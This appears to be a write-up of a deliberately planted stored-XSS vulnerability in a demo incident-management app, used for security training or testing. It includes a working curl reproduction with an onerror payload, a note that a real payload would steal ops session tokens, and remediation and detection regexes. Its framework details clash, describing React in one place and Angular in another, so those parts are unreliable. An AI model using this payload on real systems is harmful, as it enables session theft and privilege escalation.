# VULN-130 — Stored XSS via incident timeline notes

| Field | Value |
|-------|-------|
| ID | VULN-130 |
| Domain | incidents |
| CWE | CWE-79 (Improper Neutralization of Input During Web Page Generation) |
| OWASP Top 10 (2021) | A03:2021 – Injection |
| Severity | High |
| Location | `backend/app/routers/incidents.py:203-207` (sink: storage), `frontend/src/app/pages/incident-detail.page.ts` (sink: render, `entryHtml` + `[innerHTML]`), `backend/app/services/incidents.py:248-250` (postmortem interpolation) |
| Introduced by | Workstream 9 — incidents (branch `devin/iberia-incidents`) |

## Description

`POST /api/incidents/{id}/timeline` persists the responder note exactly as supplied: there is no
HTML sanitisation, no allow-list and no output encoding anywhere in the path. The incident detail
page then renders each note with `dangerouslySetInnerHTML`:

```tsx
<td dangerouslySetInnerHTML={{ __html: entry.message }} />
```

Any HTML in a timeline note therefore executes in the browser of **every** responder who opens
that incident — exactly the audience with `ops`, `sre` or `admin` privileges. The generated
postmortem (`GET /api/incidents/{id}/postmortem`) interpolates the same raw strings into its
markdown, so the payload survives into the artefact that is copied into wikis and tickets.

Any authenticated user can write a timeline entry (the endpoint only depends on `current_user`),
so a low-privilege account can plant the payload and wait for an incident commander to read it.

## Reproduction

```bash
BASE=http://127.0.0.1:8000

# 1. any authenticated user (a customer is enough)
TOKEN=$(curl -s -X POST $BASE/api/auth/login -H 'Content-Type: application/json' \
  -d '{"email":"customer@iberia.demo","password":"Iberia2026!"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')

# 2. pick the open Sev1 incident from the seeded board
ID=$(curl -s -H "Authorization: Bearer $TOKEN" "$BASE/api/incidents?status=open" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)[0]["id"])')

# 3. plant the payload
curl -s -X POST $BASE/api/incidents/$ID/timeline \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"kind":"note","message":"<img src=x onerror=\"fetch(1+1==2?String.fromCharCode(47):0)||alert(document.domain)\">investigating"}'

# 4. read it back — stored verbatim
curl -s -H "Authorization: Bearer $TOKEN" $BASE/api/incidents/$ID \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["timeline"][-1]["message"])'
```

Expected insecure result: the API returns the raw `<img src=x onerror=...>` string, and opening
`http://localhost:5173/ops/incidents/$ID` in the ops console executes the payload (the demo
payload raises `alert(document.domain)`). A real payload would read
`localStorage['iberia.token']` — the session token of an ops/SRE/admin user — and exfiltrate it.

## Blast radius

* Session-token theft from every responder who views the incident, i.e. privilege escalation to
  `ops`, `sre` or `admin`.
* Attacker-controlled actions performed as the commander: resolving incidents, editing the
  timeline, and anything else the stolen token permits across the estate.
* Persistent tampering with the audit trail: the payload can also rewrite what the timeline
  *appears* to say (`<span style="display:none">`), corrupting the postmortem record.
* Payload propagates into the postmortem markdown pasted into external wikis and tickets.

## Intended remediation

1. Stop rendering user content as HTML: render `{entry.message}` as text (React escapes it), and
   delete the `dangerouslySetInnerHTML` usage.
2. If rich text is genuinely required, sanitise server-side with an allow-list
   (e.g. `bleach.clean(message, tags=[...], strip=True)`) on write **and** escape on render.
3. Escape timeline messages when interpolating them into the postmortem markdown.
4. Add a `Content-Security-Policy` that forbids inline script execution as defence in depth.

## Detection hints

* Grep: `rg 'bypassSecurityTrustHtml' frontend/src/app/pages/incident-detail.page.ts` — the
  incident timeline cell renders the note through `[innerHTML]`.
* Grep the backend for a write path with no sanitiser:
  `rg -n 'message=payload.message' backend/app`.
* Test assertion that pins the insecure behaviour:
  `backend/tests/test_incidents.py::test_planted_vuln_130_timeline_stores_raw_html`.
* Runtime signature: a timeline entry whose `message` matches `<[a-z]+[^>]*on[a-z]+=` in the
  structured log line `incident timeline entry`.
